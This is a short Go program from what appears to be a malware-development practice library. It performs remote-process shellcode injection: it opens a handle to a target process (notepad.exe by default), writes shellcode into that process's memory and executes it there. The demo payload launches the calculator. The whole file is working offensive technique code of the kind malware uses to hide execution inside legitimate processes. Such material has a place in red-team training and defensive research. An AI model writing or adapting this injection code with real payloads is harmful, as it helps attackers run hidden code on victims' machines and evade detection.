package main

import (
	"flag"
	"log"

	"github.com/mortimus/maldev/pkg/maldev"
	"github.com/mortimus/maldev/pkg/shellcode"
)

var sc = shellcode.Calc()

func main() {
	maldev.DEBUG = true
	// get process name from flags
	processName := flag.String("process", "notepad.exe", "Process name to inject into")
	flag.Parse()
	pid, hProcess, err := maldev.GetProcessHandle(*processName)
	if err != nil {
		log.Fatalf("Failed to get process handle: %s\n", err)
	}
	defer maldev.CloseHandle(hProcess)
	maldev.Debugf("Found Process %s with PID %d\n", *processName, *pid)
	maldev.Debugf("Injecting shellcode at %p into %s\n", &sc, *processName)
	maldev.DebugWait("Inject")
	maldev.Debugf("Injecting shellcode of length %d bytes\n", len(sc))
	shellcode.Print("Shellcode", 0, sc)
	pAddress, err := maldev.InjectShellcodeToRemoteProcess(hProcess, sc, len(sc))
	if err != nil {
		log.Fatalf("Failed to inject shellcode: %s\n", err)
	}
	maldev.Debugf("Shellcode injected at 0x%X\n", pAddress)
	err = maldev.RunShellcodeToRemoteProcess(hProcess, maldev.LPVOID(pAddress))
	if err != nil {
		log.Fatalf("Failed to run shellcode: %s\n", err)
	}
	maldev.DebugWait("Done")
}
